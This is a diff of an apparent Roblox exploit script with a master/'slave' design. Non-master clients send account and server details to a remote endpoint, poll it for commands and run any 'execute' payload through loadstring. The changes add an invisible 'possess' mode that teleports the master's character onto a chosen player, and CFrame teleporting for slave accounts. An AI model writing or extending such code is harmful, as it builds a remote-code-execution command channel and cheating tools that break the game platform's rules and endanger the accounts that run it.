@@ -4,6 +4,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
 
 local MASTERS = {["huynesoi"] = true, ["soicon19911"] = true}
 local isMaster = MASTERS[LP.Name] or false
@@ -11,6 +12,7 @@ local isMaster = MASTERS[LP.Name] or false
 local selectedLead = nil
 local selectedFollowers = {}
 local currentViewing = nil
+local isPossessing = false
 
 local function Post(path, data)
     local suc, res = pcall(function()
@@ -49,7 +51,8 @@ if isMaster then
     scroll.Position = UDim2.new(0, 5, 0, 5)
     scroll.BackgroundTransparency = 1
     scroll.BorderSizePixel = 0
-    Instance.new("UIListLayout", scroll).Padding = UDim.new(0, 5)
+    local layout = Instance.new("UIListLayout", scroll)
+    layout.Padding = UDim.new(0, 8)
 
     local rightPanel = Instance.new("Frame", main)
     rightPanel.Size = UDim2.new(0.65, -30, 1, -120)
@@ -71,30 +74,23 @@ if isMaster then
     dInfo.TextXAlignment = Enum.TextXAlignment.Left
     dInfo.TextYAlignment = Enum.TextYAlignment.Top
     dInfo.TextSize = 14
-
-    local dJoin = Instance.new("TextButton", rightPanel)
-    dJoin.Size = UDim2.new(0.9, 0, 0, 35)
-    dJoin.Position = UDim2.new(0.05, 0, 0, 135)
-    dJoin.BackgroundColor3 = Color3.fromRGB(80,80,80)
-    dJoin.TextColor3 = Color3.new(1,1,1)
-    dJoin.Text = "JOIN SERVER"
-    Instance.new("UICorner", dJoin)
+    dInfo.RichText = true
 
     local dControl = Instance.new("TextButton", rightPanel)
     dControl.Size = UDim2.new(0.42, 0, 0, 45)
-    dControl.Position = UDim2.new(0.05, 0, 0, 185)
+    dControl.Position = UDim2.new(0.05, 0, 0, 135)
     dControl.BackgroundColor3 = Color3.fromRGB(255,255,0)
     dControl.TextColor3 = Color3.new(0,0,0)
-    dControl.Text = "SET LEAD"
+    dControl.Text = "SELECT LEAD"
     dControl.Font = Enum.Font.GothamBold
     Instance.new("UICorner", dControl)
 
     local dSync = Instance.new("TextButton", rightPanel)
     dSync.Size = UDim2.new(0.42, 0, 0, 45)
-    dSync.Position = UDim2.new(0.53, 0, 0, 185)
+    dSync.Position = UDim2.new(0.53, 0, 0, 135)
     dSync.BackgroundColor3 = Color3.fromRGB(0,255,0)
     dSync.TextColor3 = Color3.new(0,0,0)
-    dSync.Text = "ADD FOLLOWER"
+    dSync.Text = "ADD SLAVE"
     dSync.Font = Enum.Font.GothamBold
     Instance.new("UICorner", dSync)
 
@@ -104,56 +100,57 @@ if isMaster then
     bottomPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
     Instance.new("UICorner", bottomPanel)
 
-    local eInput = Instance.new("TextBox", bottomPanel)
-    eInput.Size = UDim2.new(0.7, -10, 0, 40)
-    eInput.Position = UDim2.new(0, 10, 0, 10)
-    eInput.BackgroundColor3 = Color3.fromHex("#1E1F22")
-    eInput.TextColor3 = Color3.new(1,1,1)
-    eInput.TextXAlignment = Enum.TextXAlignment.Left
-    eInput.Text = ""
-    eInput.PlaceholderText = " Script Executor..."
-    Instance.new("UICorner", eInput)
+    local startControlBtn = Instance.new("TextButton", bottomPanel)
+    startControlBtn.Size = UDim2.new(0.48, 0, 0, 35)
+    startControlBtn.Position = UDim2.new(0, 10, 0, 10)
+    startControlBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+    startControlBtn.TextColor3 = Color3.new(0,0,0)
+    startControlBtn.Text = "START CONTROL"
+    startControlBtn.Font = Enum.Font.GothamBold
+    Instance.new("UICorner", startControlBtn)
 
-    local eRun = Instance.new("TextButton", bottomPanel)
-    eRun.Size = UDim2.new(0.3, -10, 0, 40)
-    eRun.Position = UDim2.new(0.7, 0, 0, 10)
-    eRun.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
-    eRun.TextColor3 = Color3.new(1,1,1)
-    eRun.Text = "EXECUTE"
-    eRun.Font = Enum.Font.GothamBold
-    Instance.new("UICorner", eRun)
-
-    local syncEnterBtn = Instance.new("TextButton", bottomPanel)
-    syncEnterBtn.Size = UDim2.new(0.48, 0, 0, 30)
-    syncEnterBtn.Position = UDim2.new(0, 10, 0, 55)
-    syncEnterBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
-    syncEnterBtn.TextColor3 = Color3.new(1,1,1)
-    syncEnterBtn.Text = "SYNC ENTER"
-    syncEnterBtn.Font = Enum.Font.GothamBold
-    Instance.new("UICorner", syncEnterBtn)
+    local syncSlavesBtn = Instance.new("TextButton", bottomPanel)
+    syncSlavesBtn.Size = UDim2.new(0.48, 0, 0, 35)
+    syncSlavesBtn.Position = UDim2.new(0.5, 5, 0, 10)
+    syncSlavesBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    syncSlavesBtn.TextColor3 = Color3.new(0,0,0)
+    syncSlavesBtn.Text = "SYNC SLAVES"
+    syncSlavesBtn.Font = Enum.Font.GothamBold
+    Instance.new("UICorner", syncSlavesBtn)
 
     local cancelBtn = Instance.new("TextButton", bottomPanel)
-    cancelBtn.Size = UDim2.new(0.48, 0, 0, 30)
-    cancelBtn.Position = UDim2.new(0.5, 0, 0, 55)
+    cancelBtn.Size = UDim2.new(0.97, 0, 0, 30)
+    cancelBtn.Position = UDim2.new(0, 10, 0, 50)
     cancelBtn.BackgroundColor3 = Color3.fromRGB(240, 71, 71)
     cancelBtn.TextColor3 = Color3.new(1,1,1)
-    cancelBtn.Text = "CANCEL ALL"
+    cancelBtn.Text = "STOP ALL & REVEAL"
     cancelBtn.Font = Enum.Font.GothamBold
     Instance.new("UICorner", cancelBtn)
 
     local function updateList()
         local users = Post("/list", {})
         if not users then return end
-        
         for _, v in pairs(scroll:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
         
         for _, u in ipairs(users) do
             local b = Instance.new("TextButton", scroll)
-            b.Size = UDim2.new(1, 0, 0, 40)
+            b.Size = UDim2.new(1, 0, 0, 45)
             b.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
             b.TextColor3 = Color3.new(1,1,1)
-            b.Text = u.name
+            b.Text = "      " .. u.name
+            b.TextXAlignment = Enum.TextXAlignment.Left
             Instance.new("UICorner", b)
+
+            local stroke = Instance.new("UIStroke", b)
+            stroke.Color = Color3.new(1,1,1)
+            stroke.Thickness = 1.5
+            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+            local btnIcon = Instance.new("ImageLabel", b)
+            btnIcon.Size = UDim2.new(0, 35, 0, 35)
+            btnIcon.Position = UDim2.new(0, 5, 0.5, -17)
+            btnIcon.Image = "rbxthumb://type=AvatarHeadShot&id="..u.id.."&w=150&h=150"
+            Instance.new("UICorner", btnIcon).CornerRadius = UDim.new(1,0)
 
             if selectedLead == u.name then
                 b.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
@@ -165,32 +162,36 @@ if isMaster then
 
             b.MouseButton1Click:Connect(function()
                 currentViewing = u
-                local s, img = pcall(function() return Players:GetUserThumbnailAsync(u.id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailResolution.Size420x420) end)
-                if s then avatarImg.Image = img end
-                dInfo.Text = string.format(" Tên: %s\n ID: %d\n Game ID: %d\n Uptime: %ds", u.name, u.id, u.placeId, u.uptime)
+                avatarImg.Image = "rbxthumb://type=AvatarHeadShot&id="..u.id.."&w=420&h=420"
+                dInfo.Text = string.format("<b>NAME:</b> %s\n<b>ID:</b> %d\n<b>UPTIME:</b> %ds", u.name, u.id, u.uptime)
             end)
         end
     end
 
-    dJoin.MouseButton1Click:Connect(function()
-        if currentViewing then TeleportService:TeleportToPlaceInstance(currentViewing.placeId, currentViewing.jobId, LP) end
+    dControl.MouseButton1Click:Connect(function() if currentViewing then selectedLead = currentViewing.name updateList() end end)
+    dSync.MouseButton1Click:Connect(function() if currentViewing then selectedFollowers[currentViewing.name] = true updateList() end end)
+
+    startControlBtn.MouseButton1Click:Connect(function()
+        if not selectedLead then return end
+        isPossessing = true
+        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        
+        task.spawn(function()
+            while isPossessing and task.wait() do
+                local target = Players:FindFirstChild(selectedLead)
+                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                    if LP.Character then
+                        for _, p in pairs(LP.Character:GetDescendants()) do
+                            if p:IsA("BasePart") then p.Transparency = 1 p.CanCollide = false end
+                        end
+                        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+                    end
+                end
+            end
+        end)
     end)
 
-    dControl.MouseButton1Click:Connect(function()
-        if currentViewing then
-            selectedLead = currentViewing.name
-            updateList()
-        end
-    end)
-
-    dSync.MouseButton1Click:Connect(function()
-        if currentViewing then
-            selectedFollowers[currentViewing.name] = true
-            updateList()
-        end
-    end)
-
-    syncEnterBtn.MouseButton1Click:Connect(function()
+    syncSlavesBtn.MouseButton1Click:Connect(function()
         if selectedLead then
             for fName, _ in pairs(selectedFollowers) do
                 Post("/send_cmd", {target = fName, type = "sync_to", data = selectedLead})
@@ -199,23 +200,18 @@ if isMaster then
     end)
 
     cancelBtn.MouseButton1Click:Connect(function()
+        isPossessing = false
+        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+        if LP.Character then
+            for _, p in pairs(LP.Character:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = 0 end end
+        end
         for fName, _ in pairs(selectedFollowers) do Post("/send_cmd", {target = fName, type = "stop_sync", data = ""}) end
-        if selectedLead then Post("/send_cmd", {target = selectedLead, type = "stop_sync", data = ""}) end
         selectedLead = nil
         selectedFollowers = {}
         updateList()
     end)
 
-    eRun.MouseButton1Click:Connect(function()
-        local code = eInput.Text
-        if code == "" then return end
-        if selectedLead then Post("/send_cmd", {target = selectedLead, type = "execute", data = code}) end
-        for fName, _ in pairs(selectedFollowers) do Post("/send_cmd", {target = fName, type = "execute", data = code}) end
-    end)
-
-    task.spawn(function()
-        while task.wait(3) do updateList() end
-    end)
+    task.spawn(function() while task.wait(3) do updateList() end end)
 
 else
     local slaveGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
@@ -225,56 +221,43 @@ else
     sFrame.BackgroundColor3 = Color3.fromHex("#1E1F22")
     sFrame.Active = true
     sFrame.Draggable = true
-    Instance.new("UICorner", sFrame).CornerRadius = UDim.new(0, 8)
-
+    Instance.new("UICorner", sFrame)
+    
     local sBtn = Instance.new("TextButton", sFrame)
     sBtn.Size = UDim2.new(1, -20, 1, -20)
     sBtn.Position = UDim2.new(0, 10, 0, 10)
     sBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
     sBtn.TextColor3 = Color3.new(1,1,1)
-    sBtn.Font = Enum.Font.GothamBold
-    sBtn.TextSize = 14
-    sBtn.Text = "SEND INFO TO MASTER"
+    sBtn.Text = "ACTIVATE CLONE"
     Instance.new("UICorner", sBtn)
 
     sBtn.MouseButton1Click:Connect(function()
         slaveGui:Destroy()
-        
+        local startTime = os.time()
         task.spawn(function()
-            local startTime = os.time()
             while task.wait(3) do
                 Post("/update", {id = LP.UserId, name = LP.Name, jobId = game.JobId, placeId = game.PlaceId, uptime = os.time() - startTime})
             end
         end)
 
         local activeTarget = nil
-
         task.spawn(function()
             while task.wait(1) do
                 local cmd = Post("/get_cmd", {name = LP.Name})
-                if cmd then
-                    if cmd.type == "sync_to" then
-                        activeTarget = cmd.data
-                    elseif cmd.type == "stop_sync" then
-                        activeTarget = nil
-                    elseif cmd.type == "execute" then
-                        local f = loadstring(cmd.data)
-                        if f then task.spawn(f) end
-                    end
+                if cmd and cmd.type then
+                    if cmd.type == "sync_to" then activeTarget = cmd.data
+                    elseif cmd.type == "stop_sync" then activeTarget = nil
+                    elseif cmd.type == "execute" then local f = loadstring(cmd.data) if f then task.spawn(f) end end
                 end
             end
         end)
 
         task.spawn(function()
-            while task.wait(0.1) do
+            while task.wait() do
                 if activeTarget then
-                    local tPlayer = Players:FindFirstChild(activeTarget)
-                    if tPlayer and tPlayer.Character and tPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
-                            local pos = tPlayer.Character.HumanoidRootPart.Position
-                            local targetVec = Vector3.new(pos.X, pos.Y, pos.Z)
-                            LP.Character.Humanoid:MoveTo(targetVec)
-                        end
+                    local t = Players:FindFirstChild(activeTarget)
+                    if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
+                        LP.Character.HumanoidRootPart.CFrame = t.Character.HumanoidRootPart.CFrame
                     end
                 end
             end
